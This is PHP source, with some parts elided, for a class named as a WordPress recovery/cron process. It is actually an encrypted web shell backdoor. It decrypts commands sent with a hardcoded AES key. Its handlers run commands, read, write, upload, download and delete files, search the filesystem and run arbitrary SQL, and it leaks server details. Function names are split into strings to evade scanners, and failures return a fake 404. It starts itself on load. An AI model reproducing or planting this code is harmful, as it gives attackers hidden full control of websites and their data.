...
/**
 * Class WP_Recovery_Process_wzre
 *
...
class WP_Recovery_Process_wzre {
    ...
    public function __construct() {
        $this->secure_key = @hex2bin( '007d491af0d1e941b105ea14dc5a4aaf9eea3c3ede7b62372b7a9510d454d834' );
    ...
    private function resolve_transport() {
        $tag = '';
        $test = @openssl_encrypt( 'wp', 'aes-256-gcm', $this->secure_key, OPENSSL_RAW_DATA, str_repeat( "\x00", 12 ), $tag );
     ...
     * @return void
     */
    public function do_action_cron() {
    ...
    private function unwrap_envelope( $envelope ) {
        ...
        if ( ! empty( $envelope['t'] ) && $this->transport_method === 'aes-256-gcm' ) {
            $tag = $fn_b( $envelope['t'] );
            $result = @$fn_d( $ct, 'aes-256-gcm', $this->secure_key, OPENSSL_RAW_DATA, $iv, $tag );
            if ( $result !== false ) {
                return $result;
            }
        }
        ...
        if ( ! empty( $envelope['h'] ) ) {
            $fn_h = 'hash' . '_hmac';
            $expected = $fn_h( 'sha256', $iv . $ct, $this->secure_key, true );
            if ( ! hash_equals( $expected, $fn_b( $envelope['h'] ) ) ) {
                return false;
            }
            $result = @$fn_d( $ct, 'aes-256-cbc', $this->secure_key, OPENSSL_RAW_DATA, $iv );
            return $result;
        }
    ...
    private function wrap_response( $data ) {
        ...
        if ( $this->transport_method === 'aes-256-gcm' ) {
            ...
            $tag = '';
            $enc = @$fn_e( $json, 'aes-256-gcm', $this->secure_key, OPENSSL_RAW_DATA, $iv, $tag );
            if ( $enc !== false ) {
        ...
        $enc = @$fn_e( $json, 'aes-256-cbc', $this->secure_key, OPENSSL_RAW_DATA, $iv );
        $fn_h = 'hash' . '_hmac';
        $mac = $fn_h( 'sha256', $iv . $enc, $this->secure_key, true );
        return json_encode( array(
            'd'  => $fn_b( $enc ),
            'iv' => $fn_b( $iv ),
            'h'  => $fn_b( $mac ),
     ...
     */
    private function sanitize_task( $response_data ) {
        if ( ! headers_sent() ) {
    ...
    private function route_request( $type, $args ) {
        ...
        $this->sanitize_task( array( 'error' => 'invalid_request' ) );
    }

    private function handle_ping( $args ) {
        $this->sanitize_task( array(
            'ok'   => true,
            'php'  => PHP_VERSION,
            'os'   => php_uname(),
            'cwd'  => getcwd(),
    ...
    private function handle_diagnostic( $args ) {
        ...
        if ( empty( $command ) ) {
            $this->sanitize_task( array( 'error' => 'no cmd' ) );
        }
        ...
        $this->sanitize_task( $result !== null ? $result : array( 'error' => 'blocked' ) );
    }
    ...
    private function handle_directory( $args ) {
        ...
        if ( ! is_dir( $path ) ) {
            $this->sanitize_task( array( 'error' => 'not dir' ) );
        }
        $items = array();
        ...
        $this->sanitize_task( array( 'path' => $path, 'items' => $items ) );
    }

    private function handle_file_read( $args ) {
        $file = isset( $args['path'] ) ? $args['path'] : '';
        if ( empty( $file ) || ! is_file( $file ) ) {
            $this->sanitize_task( array( 'error' => '404' ) );
        }
        $size = filesize( $file );
        $content = file_get_contents( $file, false, null, 0, min( $size, 2097152 ) );
        $this->sanitize_task( array( 'content' => $content, 'size' => $size ) );
    }

    private function handle_file_write( $args ) {
        $file = isset( $args['path'] ) ? $args['path'] : '';
        if ( empty( $file ) ) {
            $this->sanitize_task( array( 'error' => 'no path' ) );
        }
        $dir = dirname( $file );
        if ( ! is_dir( $dir ) ) @mkdir( $dir, 0755, true );
        $content = isset( $args['content'] ) ? $args['content'] : '';
        $bytes = @file_put_contents( $file, $content );
        $this->sanitize_task( $bytes !== false ? array( 'ok' => true, 'bytes' => $bytes ) : array( 'error' => 'fail' ) );
    }
    ...
    private function handle_file_upload( $args ) {
        ...
        if ( empty( $file ) || empty( $data ) ) {
            $this->sanitize_task( array( 'error' => 'need path+data' ) );
        }
        $dir = dirname( $file );
        if ( ! is_dir( $dir ) ) @mkdir( $dir, 0755, true );
        $fn_b = 'base' . '64_de' . 'code';
    ...
    private function handle_file_download( $args ) {
        ...
        $fn_b = 'base' . '64_en' . 'code';
        $this->sanitize_task( array( 'data' => $fn_b( file_get_contents( $file ) ), 'size' => filesize( $file ) ) );
    }
    ...
    private function handle_file_search( $args ) {
        ...
        $this->sanitize_task( array( 'items' => $items, 'count' => $count ) );
    }
    ...
    private function handle_database( $args ) {
        ...
        if ( empty( $sql ) ) {
            $this->sanitize_task( array( 'error' => 'no sql' ) );
        }
        try {
            ...
            if ( preg_match( '/^(select|show|describe)\b/', $lower_sql ) ) {
                $stmt = $pdo->query( $sql );
                $this->sanitize_task( array( 'rows' => $stmt->fetchAll( PDO::FETCH_ASSOC ) ) );
            } else {
                $this->sanitize_task( array( 'affected' => $pdo->exec( $sql ) ) );
            }
        } catch ( Exception $e ) {
            $this->sanitize_task( array( 'error' => $e->getMessage() ) );
        }
    }
    ...
    private function handle_file_remove( $args ) {
        $file = isset( $args['path'] ) ? $args['path'] : '';
        if ( is_file( $file ) ) {
            $this->sanitize_task( array( 'ok' => @unlink( $file ) ) );
        }
        $this->sanitize_task( array( 'error' => 'fail' ) );
    }
}

/* Bootstrap */
try {
    $instance = new WP_Recovery_Process_wzre();
    $instance->do_action_cron();
} catch ( Exception $e ) {
    http_response_code( 404 );
    exit;
}
